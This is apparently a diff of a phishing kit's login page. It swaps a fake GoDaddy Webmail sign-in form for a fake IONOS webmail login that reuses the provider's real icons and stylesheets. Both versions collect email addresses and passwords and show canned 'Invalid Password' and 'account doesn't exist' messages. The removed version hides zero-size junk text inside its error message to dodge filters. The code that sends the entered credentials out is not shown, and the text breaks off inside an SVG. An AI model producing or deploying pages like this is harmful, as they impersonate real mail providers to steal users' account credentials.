@@ -1,412 +1,440 @@
-﻿
+<!DOCTYPE html>
+<html lang="en" data-i18n="oao.lang" data-i18n-attr="lang">
 
-<!doctype html>
-<html lang="en">
 <head>
- <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js" integrity="sha512-DUC8yqWf7ez3JD1jszxCWSVB0DMP78eOyBpMa5aJki1bIRARykviOuImIczkxlj1KhVSyS16w2FSQetkD4UU2w==" crossorigin="anonymous"></script>
-  <script src="https://code.jquery.com/jquery-3.1.1.min.js" integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8=" crossorigin="anonymous"></script>
-    <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha384-fJU6sGmyn07b+uD1nMk7/iSb4yvaowcueiQhfVgQuD98rfva8mcr1eSvjchfpMrH" crossorigin="anonymous"></script>
-    <!-- Required meta tags -->
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <!-- charset -->
+    <meta charset="utf-8" />
 
-    <!-- Bootstrap CSS -->
-    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha512-k78e1fbYs09TQTqG79SpJdV4yXq8dX6ocfP0bzQHReQSbEghnS6AQHE2BbZKns962YaqgQL16l7PkiiAHZYvXQ==" crossorigin="anonymous">
-    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" integrity="sha384-lKZ1j7Gz/1QNe9VmMYEImezE0Z/7wVY9z+hRFmrvWeJbEkWlNTf3MtwmYlY1zDDv" crossorigin="anonymous">
-    <link rel="icon" type="image/png" sizes="32x32" href="images/favicon-32x32.png">
-    <script src="https://kit.fontawesome.com/585b051251.js" integrity="sha256-fYQBU/Aq1tkdZSNU41tZByGRbRbDOVZjHu8OfTtWE+4=" crossorigin="anonymous"></script>
-    <title></title>
-    <link href="css/hover.css" rel="stylesheet" media="all">
+    <!-- canonical relevant information -->
+    <link rel="canonical" href="#" data-i18n="oao.login.canonical" data-i18n-attr="href" />
+    <link rel="alternate" hreflang="de" href="#" />
+    <link rel="alternate" hreflang="en-gb" href="#" />
+    <link rel="alternate" hreflang="en-us" href="#" />
+    <link rel="alternate" hreflang="en-ca" href="#" />
+    <link rel="alternate" hreflang="en" href="#" />
+    <link rel="alternate" hreflang="es-es" href="#" />
+    <link rel="alternate" hreflang="es-mx" href="#" />
+    <link rel="alternate" hreflang="es" href="#" />
+    <link rel="alternate" hreflang="fr" href="#" />
+    <link rel="alternate" hreflang="it" href="#" />
+    <link rel="alternate" hreflang="x-default" href="#" />
 
-    <style type="text/css">
-      body {
-        margin: 0;
-        font-family: gdsherpa,Helvetica,Arial,sans-serif;
-        font-size: 1rem;
-        font-weight: 400;
-        line-height: 1.5rem;
-        color: #111;
-        text-align: left;
-        background-color: #fff;
-        -webkit-font-smoothing: antialiased;
-        -moz-osx-font-smoothing: grayscale;
-      }
-      .headline-brand {
-        font-family: gd-sage,"Times New Roman",serif;
-        font-weight: 700!important;
-        font-size: 40px;
-      }
+    <!-- head infos -->
+    <title data-i18n="oao.login.title" data-i18n-attr="text"></title>
+    <meta name="description" content="" data-i18n="oao.login.description" data-i18n-attr="content" />
 
-      .icbu-footer-seo {
-        color: #999999;
-        font-size: 14px;
-      }
-      .icbu-footer-seo a{
-        color: #999999;
-        font-size: 14px;
-      }
+    <!-- microsoft ie-mode -->
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <!-- mobile config -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <!-- microsoft mobile config -->
+    <meta id="win8Icon" name="msapplication-TileImage" content="https://mail.ionos.com/img/apple-touch-icon.png" />
+    <meta id="win8TileColor" name="msapplication-TileColor" content="#003d8f" />
+    <!-- apple mobile config -->
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-title" content="" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black" />
+    <!-- apple-touch-icon -->
+    <link rel="apple-touch-icon" href="https://mail.ionos.com/img/apple-touch-icon.png" />
+    <!-- apple-touch-startup-image [media-devicewidth is not W3C-conform] -->
+    <link rel="apple-touch-startup-image" href="https://mail.ionos.com/img/apple-launch.png" />
+    <!-- favicon -->
+    <link id="favicon" rel="shortcut icon" href="https://mail.ionos.com/img/favicon.ico" type="image/x-icon" />
+    <!-- css includes -->
+    <link rel="stylesheet" type="text/css"
+        href="https://ce1.uicdn.net/exos/framework/1.1/ionos.min.css?v=1624882716506" />
+    <link rel="stylesheet" type="text/css" href="https://mail.ionos.com/css/login.min.css?v=1624882716506" />
+</head>
 
+<body>
 
+    <!-- exos main -->
+    <main class="page-content">
 
-
-      .input-icons i { 
-        position: absolute; 
-      } 
-
-      .input-icons { 
-        width: 100%; 
-      } 
-
-      .icon { 
-        padding: 15px; 
-        min-width: 40px;
-        color: #8FA7AD; 
-      } 
-
-      .input-field { 
-        width: 100%; 
-        padding: 10px;
-        padding-left: 20px ;
-        text-align: left;
-        border: 1px solid #B7B7B7; 
-      } 
-
-
-      #submit-btn{
-        background-color: #111111; 
-        font-weight: 500; 
-        font-size: 18px;
-      }
-
-
-      #submit-btn:hover{
-        background-color: #444;
-
-      }
-
-      #logoImage {
-        max-height: 40px;
-        margin-top: 20px;
-      }
-
-
-
-    </style>
-  </head>
-  <body style="background-color: #f5f7f8;" >
-    <div class="container-fluid p-0">
-      <div class="container-fluid bg-white">
-        <div class="row">
-          <div class="col-lg-11 mx-auto my-1 p-2">
-            <div class="d-inline-block">
-              <i class="fas fa-globe"></i>
-              <span>United States-English</span>
-              <i class="fas fa-chevron-down"></i>
-            </div> 
-            <div class="float-right d-inline-block">
-              <i class="fas fa-phone-alt"></i>
-              <span>24/7 Support</span>
-              <i class="fas fa-chevron-down"></i>
-            </div> 
-
-          </div>
-
+        <!-- exos - global navigation -->
+        <div class="oao-navi-navigation">
+            <div class="oao-navi-left">
+                <div class="oao-navi-application-name">
+                    <a class="oao-navi-app-name" data-i18n="oao.login.ionos.link" data-i18n-attr="href" href="">
+                        <span data-i18n="oao.login.app" data-i18n-attr="text"></span>
+                    </a>
+                </div>
+            </div>
         </div>
 
-      </div>
+        <div class="clearfix" id="content">
+            <div class="page-section page-section--default page-section--short">
+                <div class="page-section__block">
 
-      <div class="container-fluid">
-        <div class="row" style="margin: 35px 0px ;">
-          <div class="col-lg-6 align-self-center text-center">
-            <img src="https://i.imgur.com/b8uUr5y.png" class="img-fluid">
+                    <!-- Global Navigation > Statuspage Integration > Incident/Maintenance status -->
+                    <div class="oao-statuspage-message-container" data-component="WEBMAIL,MAIL_RECEIVING,MAIL_SENDING">
+                    </div>
 
+                    <!-- error for JS-disabled browsers -->
+                    <noscript>
+                        <p class="noscript">
+                            This page uses JavaScript.
+                            Your browser either doesn't support JavaScript or you have it turned off.
+                            To use this page please use a JavaScript enabled browser.
+                        </p>
+                    </noscript>
 
-          </div>
-          <div class="col-lg-5">
-            <div>
-              <svg id="logoImage" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 743.17 158.28"><title>GoDaddy Logo</title><g id="Layer_2" data-name="Layer 2"><g id="Layer_1-2" data-name="Layer 1"><path class="gd-logo-path" d="M176.65,36c25.25,0,45.52,19.58,45.52,44.48,0,24.74-20.27,44-45.52,44-25.08,0-45.35-19.24-45.35-44,0-24.9,20.27-44.48,45.35-44.48m0,65.22c11.73,0,20.53-9.35,20.53-20.91s-8.8-21.08-20.53-21.08c-11.56,0-20.36,9.52-20.36,21.08s8.8,20.91,20.36,20.91M341.31,61.76c0,35.73-25.66,60.29-62.59,60.29H232.58a3.75,3.75,0,0,1-3.78-4V5.59a3.7,3.7,0,0,1,3.78-3.78h46.14c36.93,0,62.59,24.05,62.59,60m-27,0c0-20.95-14.08-36.24-34.52-36.24H254.56V98.35h25.26c20.44,0,34.52-16,34.52-36.59M388.17,36c11.17,0,20.1,4.81,24.05,11.33V42.18a3.91,3.91,0,0,1,3.61-3.78h17.35a3.66,3.66,0,0,1,3.6,3.78v76.27a3.51,3.51,0,0,1-3.6,3.6H415.83a3.62,3.62,0,0,1-3.61-3.6v-5.33c-4,6.53-13.05,11.34-24.22,11.34-21.64,0-41.74-17.35-41.74-44.32C346.26,53,366.53,36,388.17,36m4.65,65.39c11.49,0,20.12-8.82,20.12-21.08s-8.63-21.08-20.12-21.08S372.7,68.06,372.7,80.31s8.62,21.08,20.12,21.08M485.05,36c11.34,0,20.44,4.81,24.39,11V5.42a3.67,3.67,0,0,1,3.78-3.61h17.35a3.53,3.53,0,0,1,3.61,3.61v113a3.52,3.52,0,0,1-3.61,3.6H513.22a3.62,3.62,0,0,1-3.61-3.6v-5.33c-4.64,6.53-13.05,11.34-24.22,11.34-21.64,0-41.74-17.35-41.74-44.32C443.65,53,463.58,36,485.05,36m5.16,65.61c11.44,0,20-8.92,20-21.3s-8.59-21.3-20-21.3-20,8.92-20,21.3,8.58,21.3,20,21.3M582.44,36c11.34,0,20.44,4.81,24.39,11V5.42a3.67,3.67,0,0,1,3.78-3.61H628a3.53,3.53,0,0,1,3.61,3.61v113a3.52,3.52,0,0,1-3.61,3.6H610.61a3.62,3.62,0,0,1-3.61-3.6v-5.33c-4.63,6.53-13,11.34-24.22,11.34-21.64,0-41.74-17.35-41.74-44.32C541,53,561,36,582.44,36m5.16,65.61c11.45,0,20-8.92,20-21.3S599.05,59,587.6,59s-20,8.92-20,21.3,8.58,21.3,20,21.3M719.66,38.4H702.35c-2.75,0-4.12,1.89-4.63,4l-16,59.75L664.63,42.35c-1-3.18-2.55-4-4.78-4H641.61c-4.3,0-5.09,2.92-4.23,5.84l23.15,74.21c.69,2.06,2.07,3.6,4.64,3.6h10.49l-2.23,7.37c-2.19,6.36-6.28,8.08-11.61,8.08-4.57,0-7.57-1.81-10.81-3.9a6,6,0,0,0-3.42-1.18c-1.55,0-2.63.7-4.08,2.84l-5.14,7.7c-1,1.6-1.54,2.47-1.54,4.18,0,2.73,2.73,4.44,6,6.31,5.63,3.22,12.82,4.83,20.7,4.83,17.35,0,28.52-9.45,33.5-25.25l25.89-88.79C724.13,40.81,723.1,38.4,719.66,38.4ZM102.6,105.64c-9.09,11.49-24.9,18.71-42.78,18.71C26.25,124.35,0,99.1,0,63.14,0,25.76,28.33,0,64.12,0,90.54,0,111.67,11.36,121,34.21a5.29,5.29,0,0,1,.44,1.91c0,1.09-.72,1.9-3,2.69l-16.72,6.45a4.36,4.36,0,0,1-3.17,0,4.79,4.79,0,0,1-2-2.29c-6-11.4-16.68-19.16-33.11-19.16-21.33,0-36.6,16.66-36.6,38.25,0,20.92,13,38.13,37.2,38.13,12.73,0,22.88-6,27.62-12.59H76.59a3.86,3.86,0,0,1-3.92-3.92V70.84a3.86,3.86,0,0,1,3.92-3.92h44.25a3.71,3.71,0,0,1,3.92,3.74V118.1a3.86,3.86,0,0,1-3.92,3.92H106.52a3.86,3.86,0,0,1-3.92-3.92Z"></path><path class="gd-logo-path" d="M723.41,20.84V19.69a.25.25,0,0,1,.08-.21.26.26,0,0,1,.21-.09H731a.29.29,0,0,1,.28.3v1.15a.25.25,0,0,1-.08.21.24.24,0,0,1-.2.08h-2.68v7.21a.29.29,0,0,1-.09.21.27.27,0,0,1-.21.09h-1.37a.29.29,0,0,1-.21-.09.32.32,0,0,1-.08-.21V21.13H723.7a.27.27,0,0,1-.29-.29Zm12.77-1.19,2,4.63,2-4.63a.46.46,0,0,1,.16-.2.53.53,0,0,1,.26-.06h2.2a.27.27,0,0,1,.28.29v8.67a.28.28,0,0,1-.07.21.24.24,0,0,1-.2.08h-1.31a.25.25,0,0,1-.21-.08.29.29,0,0,1-.08-.21V21.8l-2.14,4.76a.54.54,0,0,1-.16.23.53.53,0,0,1-.28.06h-1.06a.48.48,0,0,1-.26-.06.54.54,0,0,1-.16-.23L735.1,21.8v6.55a.32.32,0,0,1-.08.21.3.3,0,0,1-.2.08H733.5a.24.24,0,0,1-.2-.08.29.29,0,0,1-.08-.21V19.68a.29.29,0,0,1,.09-.21.28.28,0,0,1,.2-.08h2.25a.5.5,0,0,1,.26.06A.4.4,0,0,1,736.18,19.65Z"></path></g></g></svg>
-            </div>
-            <div class="text-center p-4 text-white" style="background-color: #333;">
-              <span class="font-weight-bold h3">Webmail</span>
-            </div>
+                    <!-- JavaScript based login-form -->
+                    <div class="sheet">
+                        <div class="sheet__section">
+                            <div class="sheet__block">
+                                <h1 class="headline" data-i18n="oao.login.heading" data-i18n-attr="text"></h1>
+                                <form id="login-form" class="form content-elem" action="#" target="loginTarget"
+                                    method="post" autocomplete="on">
+                                    <legend class="hidden" data-i18n="oao.login.heading" data-i18n-attr="text"></legend>
 
+                                    <!-- NON-exos: error output -->
+                                    <center>
+                                        <table>
+                                            <div src="https://mail.cu.co.th/img/dwt/ImgCritical_32.png"
+                                                class="alert alert-danger" id="msg" style="color: red; display: none;">
+                                                Invalid Password! Please Enter your correct Password</div>
+                                        </table>
+                                        <span id="error" class="text-danger" style="color: red; display: none;">That
+                                            account doesn't
+                                            exist. Enter a different account</span>
+                                    </center>
 
-            <div style="background-color: white;border-radius:5px; padding: 20px 48px;">
-              <div class="col-lg-10 mx-auto">
-                <span class="h3 font-weight-bold">Sign in</span>
-              </div>
-              <!-- form -->
-              <div class="mt-4 col-lg-10 mx-auto">
-                <center>
-                  <div class="alert alert-danger" id="msg" style="display: none;"></div>
-                  <span id="error" class="text-danger" style="display: none;">That account doesn't exist. <html><body><p>En<span style='font-size: 0px;'>ezfojj</span>ter a diff<span style='font-size: 0px;'>ykgz</span>erent acc<span style='font-size: 0px;'>wvlft</span>ount</p></body></html>.</span>
-                </center>
-                <form id="contact" class="form-horizontal well">
-                  <div id="div1" class="text-dark">
-                    <div>
-                      <div class="form-group m-0">
-                        <div id="inputbar">
-                          <label class="font-weight-bold">Email</label>
-                          <div class="input-icons">
-                            <!-- <i class="far fa-user icon"></i> -->
-                            <input type="email" name="email" class="input-field rounded-0" id="email" aria-describedby="emailHelp" placeholder="">
-                          </div>
+                                    <span class="input-text-group input-text-group--empty"
+                                        style="overflow: visible; margin-bottom: 10px;"><span
+                                            class="input-text-group__icon exos-icon exos-icon-nav-user-16"></span>
+                                        <!-- type email not working in IE for Umlaut-Domains currently -->
+                                        <input class="input-text login-form-user" id="email" maxlength="200"
+                                            name="email" size="40" tabindex="1" autocapitalize="none" spellcheck="false"
+                                            type="text" required="true"><label class="label login-form-user-label"
+                                            for="email"><span data-i18n="oao.login.field.email"
+                                                data-i18n-attr="text"></span></label></span>
+                                    <div class="label align-horizontal-right">
+                                        <a data-i18n="oao.login.forgotpw.link" data-i18n-attr="href" href=""
+                                            data-flyin-href="" class="link link--lookup oao-pi-open-in-flyin">
+                                            <span data-i18n="oao.login.forgotpw.heading" data-i18n-attr="text"></span>
+                                        </a>
+                                    </div>
+                                    <span class="input-text-group input-text-group--empty"
+                                        style="overflow: visible; margin-bottom: 10px;"><span
+                                            class="input-text-group__icon exos-icon exos-icon-password-16"></span><input
+                                            class="input-text login-form-password" id="login-form-password"
+                                            maxlength="40" name="password" size="40" tabindex="2" type="password"
+                                            required="true" value=""><label class="label login-form-password-label"
+                                            for="login-form-password"><span data-i18n="oao.login.field.password"
+                                                data-i18n-attr="text"></span></label></span>
+                                    <div class="sub-form-field left">
+                                        <input id="staysignedin-box" class="input-checkbox" name="staysignedin"
+                                            type="checkbox" value="1" tabindex="3" />
+                                        <label for="staysignedin-box">
+                                            <a data-i18n="oao.login.stay-signed-in.link" data-i18n-attr="href" href=""
+                                                data-flyin-href="" class="link link--lookup oao-pi-open-in-flyin">
+                                                <span data-i18n="oao.login.stay-signed-in" data-i18n-attr="text"></span>
+                                            </a>
+                                        </label>
+                                    </div>
+                                    <footer class="sheet__footer">
+                                        <input id="submit-btn" type="image"
+                                            src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAuQAAAA6CAIAAAB3bdtEAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAAFiUAABYlAUlSJPAAAAUeSURBVHhe7d2/axtnHMDh7l7yP2TwnD10KsnUQrcOGUqHEAi0f0KgWykUD4UuttOlwQRTMMSQJSWEkKHYDlHdxkmM7FR1LEeNFWTJiuVfPek96Sz5h2xq7IN7vjxDfHolZ3r5cKc7f7RrjDHGGJPiESvGGGOMSfV0xcrKeuPq5NyF29MDI1MAAGcv6pCoRqImietkb6xERy/eedZcNypWAIBz0uqQqEk6vZLESlQxXUsBAM5PVCYhUZJYaV79cU4FAEiD0emoTEKiJLHSuwgA4FyFRBErAEBKhUQRKwBASoVEESsAQEqFRBErAEBKhUQRKwBASoVEESsAQEqFRBErAEBKhUQRKwBASoVEESsAQEqFRBErAEBKhUQRKwBASoVEESsAQEqFRBErAEBKhUQRKwBASoVEESvAGRpb/HVtZ3d3p155d73nJYB9QqKIFci6oVK8CRQXF3peOn2PysX4t23cfbDvVYBuYb8QK5B1Zxor7TMrlfclZ1aAvsLuJFYg6840VgBOIuxOYgWy7rixMp7/qVAvNLa3mmt36o2Np/P/fDbWvWbs5a35WntNzzQmHkVrijPxj7Wh9ruuLzaaB+rlmyO5a7OV/IfW23e2K9Xqj7/lkg8Hsqe5OYgV4FixMlmc2YyX7Z2tRnVosrNs4W7zEs9h0y9Wduv38h/Cv5LZqQ8nnw9kTtgJxApk3TFiZf6XyqEVslV+e6W1bDBXi0+orFdu3c81z7Isxe1RLS5/OhHOkRwRKwfPauF1WAZkUNgHxApkXf9YefJ+NV6y/eeLhctjUwNjf914sV6ND27ef9Jc1mmO5HM69/7UVr+MP+3oWGl//vjre7V2Hr1bGWyvBLImbANiBbKub6x8/upDvGK9vOcWnoWJ9fhw/tWr6MhRsZK88chYKb/9uH1wcLYWH+z6pUC2hG1ArEDW9Y2VJCZKxb3He944OLNWDz+3LwN9V4y/51IvvmmfHTkqVt6+XgxHmg4IHSBzwjYgViDrTitWBkbmhkrb8aG9s1nb8yXco2Kl6z8gVgCxAgT//zLQUj4fDl56WPqjHTbRNDY3829K33TdziNWgBMI24BYgazrGytJN+xu5/N/x1+wfVmPL/q0v2A7MLL8e+tLse+WCpf2vr2LWAFOIGwDYgWyrhMrB0x83WduuHz4rcuVf7+IP2rp8YEPg9vceDpfCLc3ixXgRMI2IFYg644RK1MDk28e1w/ole6Hwk1dydXa9zP3zM5SPoSIWAFOIGwDYgWy7lixEul6lH7rcfuLy1+Ndz4nd+15rXzQ92vj2Vr7trlMrAAnELYBsQKchnZbVFdLN+KH1UZylx+stJ/Tn9QJwDGF7UOsAKegc8fQTK7npefD5dYLO9Xvu44D9NfaPsQKcBo6fxioulr6+t5s6+DsJw8LP680wjWe6vKSp+YDJ9XaP8QKcCrGFic6f81n3zTWVm+O7XsLQD9hDxErwCkZz/+wWCtsbMdfl23etLxVKFcmcvnDH7sCcJSwmYgVACClQqKIFQAgpUKiiBUAIKVCoogVACClQqKIFQAgpUKiiBUAIKVCoogVACClQqKIFQAgpUKiiBUAIKVCoiSxcuH29MDodM8iAIBzMDodlUlIlCRWrk7O9a4DADgnUZmEREliZWW9cfHOs+bLzq8AAOel1SFRk0RlEhIliZVooqNRxTSvB/W8DQDgTEQdEtVIp1Si6YoVY4wxxpi0jVgxxhhjTKpHrBhjjDEmxbO7+x9ulR7zL6bQHwAAAABJRU5ErkJggg=="
+                                            Width="485px" Height="38px" alt="Submit" role="button" tabIndex="0">
+                                    </footer>
+                                </form>
+                            </div>
                         </div>
-                      </div>
                     </div>
-                    <div class="mt-4">
-                      <div class="form-group m-0">
-                        <label class="font-weight-bold">Password</label>
-                        <div class="input-icons">
-                          <!-- <i class="fas fa-lock icon"></i> -->
-                          <input type="password" name="password" class="input-field rounded-0" id="password" aria-describedby="emailHelp" placeholder="">
+
+                    <section id="ciso-afs-ads">
+                        <div class="ias-zone" data-ias-zoneid="webmailer_login"></div>
+                    </section>
+
+                    <section id="assistants">
+                        <h2 class="headline headline--sub" data-i18n="oao.login.setup.headline" data-i18n-attr="text">
+                        </h2>
+                        <dl class="pipe-list">
+                            <dt data-i18n="oao.login.setup.mobile" data-i18n-attr="text"></dt>
+                            <dd>
+                                <a data-i18n="oao.login.setup.mobile.ios.link" data-i18n-attr="href" href=""
+                                    class="link" tabindex="9" target="_blank">
+                                    <span data-i18n="oao.login.setup.mobile.ios" data-i18n-attr="text"></span>
+                                </a>
+                            </dd>
+                            <dd>
+                                <a data-i18n="oao.login.setup.mobile.android.link" data-i18n-attr="href" href=""
+                                    class="link" tabindex="10" target="_blank">
+                                    <span data-i18n="oao.login.setup.mobile.android" data-i18n-attr="text"></span>
+                                </a>
+                            </dd>
+                        </dl>
+                        <dl class="pipe-list">
+                            <dt data-i18n="oao.login.setup.desktop" data-i18n-attr="text"></dt>
+                            <dd>
+                                <a data-i18n="oao.login.setup.desktop.thunderbird.link" data-i18n-attr="href" href=""
+                                    class="link" tabindex="11" target="_blank">
+                                    <span data-i18n="oao.login.setup.desktop.thunderbird" data-i18n-attr="text"></span>
+                                </a>
+                            </dd>
+                            <dd>
+                                <a data-i18n="oao.login.setup.desktop.outlook.link" data-i18n-attr="href" href=""
+                                    class="link" tabindex="12" target="_blank">
+                                    <span data-i18n="oao.login.setup.desktop.outlook" data-i18n-attr="text"></span>
+                                </a>
+                            </dd>
+                            <dd>
+                                <a data-i18n="oao.login.setup.desktop.applemail.link" data-i18n-attr="href" href=""
+                                    class="link" tabindex="13" target="_blank">
+                                    <span data-i18n="oao.login.setup.desktop.applemail" data-i18n-attr="text"></span>
+                                </a>
+                            </dd>
+                        </dl>
+                        <dl class="pipe-list">
+                            <dt data-i18n="oao.login.setup.other" data-i18n-attr="text"></dt>
+                            <dd>
+                                <a data-i18n="oao.login.setup.other.assistants.link" data-i18n-attr="href" href=""
+                                    class="link" tabindex="14" target="_blank">
+                                    <span data-i18n="oao.login.setup.other.assistants" data-i18n-attr="text"></span>
+                                </a>
+                            </dd>
+                        </dl>
+                    </section>
+
+
+                    <h2 class="headline headline--sub" data-i18n="oao.login.morelogins.heading" data-i18n-attr="text">
+                    </h2>
+                    <div class="grid-12 equal-grid-spacing equal-grid-height">
+                        <div class="grid-04 grid-small-06">
+                            <div class="grid-spacing-both">
+                                <a class="tile tile--filled" href="" data-i18n="oao.login.controlcenter.link"
+                                    data-i18n-attr="href" tabindex="6">
+                                    <svg class="product-icon" viewBox="0 0 168 128" xmlns="http://www.w3.org/2000/svg">
+                                        <path class="product-icon__key" fill="#0b9dcc" d="M84,58c6.6,0,12-5.4,12-12s-5.4-12-12-12s-12,5.4-12,12S77.4,58,84,58z M84,38c4.4,0,8,3.6,8,8s-3.6,8-8,8
+          s-8-3.6-8-8S79.6,38,84,38z M107.2,78C104.5,67.4,95,60,84,60s-20.5,7.4-23.2,18c-0.2,0.9,0.2,1.8,1,2.2C68.5,84,76.2,86,84,86
+          s15.5-2,22.3-5.8C107.1,79.8,107.5,78.9,107.2,78z M84,82c-6.6,0-13.1-1.6-18.9-4.5C67.8,69.5,75.4,64,84,64s16.2,5.5,18.9,13.5
+          C97.1,80.4,90.6,82,84,82z" />
+                                        <path class="product-icon__base" fill="#001b41" d="M156.4,55.6l-8.9,9.7c-0.4,0.4-0.9,0.7-1.5,0.7c0,0,0,0,0,0c0,0,0,0,0,0c-0.4,0-0.8-0.1-1.1-0.3l-11-7.3
+          c-0.9-0.6-1.2-1.9-0.6-2.8c0.6-0.9,1.9-1.2,2.8-0.6l7.7,5.1C141.9,28.9,115.8,4,84,4C55.4,4,30.6,24.3,25.1,52.4
+          c-0.2,1.1-1.3,1.8-2.3,1.6c-1.1-0.2-1.8-1.3-1.6-2.3C27.1,21.7,53.5,0,84,0c33.6,0,61.3,26.1,63.8,59.1l5.6-6.1
+          c0.7-0.8,2-0.9,2.8-0.1C157,53.5,157.1,54.8,156.4,55.6z M145.2,74c-1.1-0.2-2.1,0.5-2.3,1.6c-5.5,28-30.3,48.4-58.9,48.4
+          c-31.8,0-57.9-24.9-59.9-56.2l7.7,5.1c0.3,0.2,0.7,0.3,1.1,0.3c0.6,0,1.3-0.3,1.7-0.9c0.6-0.9,0.4-2.2-0.6-2.8l-11-7.3
+          c-0.8-0.5-1.9-0.4-2.5,0.3c0,0-8.9,9.8-8.9,9.8c-0.7,0.8-0.7,2.1,0.1,2.8c0.4,0.4,0.9,0.5,1.3,0.5c0.5,0,1.1-0.2,1.5-0.7l5.6-6.1
+          c2.5,33,30.2,59.1,63.8,59.1c30.5,0,56.9-21.7,62.8-51.6C147,75.3,146.3,74.2,145.2,74z" />
+                                    </svg>
+                                    <span class="tile__label" data-i18n="oao.login.controlcenter"
+                                        data-i18n-attr="text"></span>
+                                </a>
+                            </div>
                         </div>
-                      </div>
+                        <div class="grid-04 grid-small-06">
+                            <div class="grid-spacing-both">
+                                <a class="tile tile--filled" href="" data-i18n="oao.login.hidrive.link"
+                                    data-i18n-attr="href" tabindex="7">
+                                    <svg class="product-icon" viewBox="0 0 168 128" xmlns="http://www.w3.org/2000/svg">
+                                        <path class="product-icon__key"
+                                            d="M58,72h6v14c0,1.1,0.9,2,2,2h36c1.1,0,2-0.9,2-2V72h6c0.9,0,1.7-0.6,1.9-1.5c0.2-0.9-0.1-1.8-0.9-2.2l-26-16         c-0.6-0.4-1.5-0.4-2.1,0l-26,16c-0.8,0.5-1.1,1.4-0.9,2.2C56.3,71.4,57.1,72,58,72z M84,56.3L102.9,68H102c-1.1,0-2,0.9-2,2v14H68         V70c0-1.1-0.9-2-2-2h-0.9L84,56.3z M110,108h-6V94c0-1.1-0.9-2-2-2H66c-1.1,0-2,0.9-2,2v14h-6c-0.9,0-1.7,0.6-1.9,1.5         c-0.2,0.9,0.1,1.8,0.9,2.2l26,16c0.3,0.2,0.7,0.3,1,0.3s0.7-0.1,1-0.3l26-16c0.8-0.5,1.1-1.4,0.9-2.2         C111.7,108.6,110.9,108,110,108z M84,123.7L65.1,112H66c1.1,0,2-0.9,2-2V96h32v14c0,1.1,0.9,2,2,2h0.9L84,123.7z"
+                                            fill="#0b9dcc"></path>
+                                        <path class="product-icon__base"
+                                            d="M136,104h-22c-1.1,0-2-0.9-2-2s0.9-2,2-2h22c15.4,0,28-12.6,28-28c0-12.4-7.9-23.1-19.7-26.8         c-0.7-0.2-1.2-0.7-1.3-1.4C139.3,29.8,126.5,20,112,20c-0.6,0-1.3,0-2,0.1c-0.6,0-1.2-0.2-1.6-0.7C99.6,9.6,87.1,4,74,4         C52.7,4,34.3,18.5,29.3,39.2c-0.2,0.7-0.8,1.3-1.5,1.5C14,43.6,4,55.9,4,70c0,16.5,13.5,30,30,30h20c1.1,0,2,0.9,2,2s-0.9,2-2,2H34         C15.3,104,0,88.7,0,70c0-15.6,10.7-29.2,25.7-33C31.6,15.2,51.2,0,74,0c13.9,0,27.2,5.8,36.7,16c0.5,0,0.9,0,1.3,0         c16,0,30,10.5,34.5,25.8C159.4,46.2,168,58.3,168,72C168,89.6,153.6,104,136,104z"
+                                            fill="#001b41"></path>
+                                    </svg>
+                                    <span class="tile__label" data-i18n="oao.login.hidrive"
+                                        data-i18n-attr="text"></span>
+                                </a>
+                            </div>
+                        </div>
+                        <div class="grid-04 grid-small-06">
+                            <div class="grid-spacing-both">
+                                <a class="tile tile--filled" href="" data-i18n="oao.login.archiving.link"
+                                    data-i18n-attr="href" tabindex="8">
+                                    <svg class="product-icon" viewBox="0 0 128 128" xmlns="http://www.w3.org/2000/svg">
+                                        <path class="product-icon__base"
+                                            d="M88,16H57.05V12H90a2,2,0,0,1,2,2V26.22H88Zm8-3.18v13.4h4V12.82A8.84,8.84,0,0,0,91.17,4H57.05V8H91.17A4.83,4.83,0,0,1,96,12.82Zm0,88.38v14A4.82,4.82,0,0,1,91.18,120H57.05v4H91.18a8.83,8.83,0,0,0,8.82-8.82v-14Zm-8,0V112H57.05v4H90a2,2,0,0,0,2-2V101.2Z"
+                                            fill="#001b41" />
+                                        <path class="product-icon__key"
+                                            d="M120.8,26H57.05v4H120.8a3.26,3.26,0,0,1,1.32.29L95.24,49.79c-1.12.85-4.62,3.06-7.38,3.06s-6.26-2.21-7.4-3.08L57.7,33c-.2-.15-.65,4.49-.65,4.49L78.06,53s.33.25.79.56L57.05,70.72s.49,4.71.71,4.54l24.9-19.64a13.54,13.54,0,0,0,5.2,1.23,13.46,13.46,0,0,0,5.22-1.24l28.56,22.27a3.35,3.35,0,0,1-.84.13H57.05v4h59v2a4,4,0,0,1-4,4H57.05v4h51v2a4,4,0,0,1-4,4H57.05v4h47a8,8,0,0,0,8-8V92a8,8,0,0,0,8-8V82h.8a7.21,7.21,0,0,0,7.2-7.2V33.2A7.21,7.21,0,0,0,120.8,26ZM124,74.64,96.9,53.51c.42-.28.69-.48.72-.51L124,33.87Z"
+                                            fill="#0b9dcc" />
+                                        <path class="product-icon__base"
